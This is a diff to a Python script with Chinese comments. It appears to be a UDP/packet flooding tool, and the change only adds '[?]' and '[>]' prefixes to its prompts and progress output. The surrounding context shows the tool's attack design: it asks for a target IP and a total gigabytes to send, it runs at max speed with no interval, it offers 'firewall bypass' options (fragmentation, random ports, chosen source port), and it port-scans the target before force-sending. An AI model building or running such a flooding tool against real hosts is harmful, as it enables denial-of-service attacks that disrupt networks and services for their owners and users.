@@ -39,7 +39,7 @@ print("")
 # 目标 IP 验证
 while True:
     try:
-        ip_str = input("IP Target : ").strip()
+        ip_str = input("[?]IP Target : ").strip()
         ipaddress.ip_address(ip_str)
         target_ip = ip_str
         break
@@ -68,7 +68,7 @@ while True:
 # 总流量输入（单位 GB）
 while True:
     try:
-        gb_str = input("Total data to send (GB) : ").strip()
+        gb_str = input("[?]Total data to send (GB) : ").strip()
         total_gb = float(gb_str)
         if total_gb <= 0:
             print("[!] 流量必须大于 0 GB。")
@@ -80,20 +80,20 @@ while True:
 # 可选速率限制（发包间隔）
 rate_limit = 0.0
 try:
-    rate_str = input("Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
+    rate_str = input("[?]Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
     rate_limit = float(rate_str)
 except ValueError:
     rate_limit = 0.0
 
 # ---------- 防火墙绕过选项 ----------
 print("\n--- 防火墙绕过选项 (仅供实验) ---")
-src = input("指定源端口 (留空则系统随机分配): ").strip()
+src = input("[?]指定源端口 (留空则系统随机分配): ").strip()
 source_port = int(src) if src else None
 
-frag = input("启用 IP 分片? (y/N): ").strip().lower()
+frag = input("[?]启用 IP 分片? (y/N): ").strip().lower()
 use_fragmentation = (frag == 'y')
 
-rnd = input("使用随机目标端口? (y/N): ").strip().lower()
+rnd = input("[?]使用随机目标端口? (y/N): ").strip().lower()
 random_target_port = (rnd == 'y')
 
 # 根据分片设置载荷大小（初始值）
@@ -149,21 +149,21 @@ if target_port is not None and user_provided_port:
         print(f"[+] 端口 {final_port} 可达，将直接使用。")
     else:
         print(f"[!] 端口 {target_port} 不可达。")
-        scan_choice = input("是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
+        scan_choice = input("[?]是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
         if scan_choice == 'y':
             print("\n请选择扫描模式：")
             print("1. 快速扫描 (常用端口)")
             print("2. 全端口扫描 (1-65535，耗时较长)")
             print("3. 自定义范围")
-            mode = input("请输入选项 (1/2/3): ").strip()
+            mode = input("[?]请输入选项 (1/2/3): ").strip()
             if mode == '1':
                 ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
             elif mode == '2':
                 ports = range(1, 65536)
             elif mode == '3':
                 try:
-                    start_port = int(input("起始端口: "))
-                    end_port = int(input("结束端口: "))
+                    start_port = int(input("[?]起始端口: "))
+                    end_port = int(input("[?]结束端口: "))
                     if start_port < 1 or end_port > 65535 or start_port > end_port:
                         print("[!] 端口范围无效，将使用快速扫描。")
                         ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
@@ -183,7 +183,7 @@ if target_port is not None and user_provided_port:
             else:
                 print("[!] 未发现任何开放端口。")
                 while True:
-                    force_choice = input("是否使用原端口强制发送？(y/n): ").strip().lower()
+                    force_choice = input("[?]是否使用原端口强制发送？(y/n): ").strip().lower()
                     if force_choice == 'y':
                         final_port = target_port
                         print(f"[*] 将使用原端口 {final_port} 强制发送。")
@@ -195,7 +195,7 @@ if target_port is not None and user_provided_port:
                         print("[!] 请输入 y 或 n。")
         else:
             while True:
-                force_choice = input("是否使用原端口强制发送？(y/n): ").strip().lower()
+                force_choice = input("[?]是否使用原端口强制发送？(y/n): ").strip().lower()
                 if force_choice == 'y':
                     final_port = target_port
                     print(f"[*] 将使用原端口 {final_port} 强制发送。")
@@ -211,7 +211,7 @@ else:
     print("1. 快速扫描 (常用端口)")
     print("2. 全端口扫描 (1-65535，耗时较长)")
     print("3. 自定义范围")
-    mode = input("请输入选项 (1/2/3): ").strip()
+    mode = input("[?]请输入选项 (1/2/3): ").strip()
     if mode == '1':
         ports = [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
     elif mode == '2':
@@ -311,7 +311,7 @@ try:
             gb_sent = sent_bytes / (1024 * 1024 * 1024)
             elapsed = time.time() - start_time
             pps = sent / elapsed if elapsed > 0 else 0
-            print(f"已发送: {sent} 包 ({gb_sent:.4f} GB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
+            print(f"[>]已发送: {sent} 包 ({gb_sent:.4f} GB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
             next_mb_threshold += 1024 * 1024
 
         if rate_limit > 0:
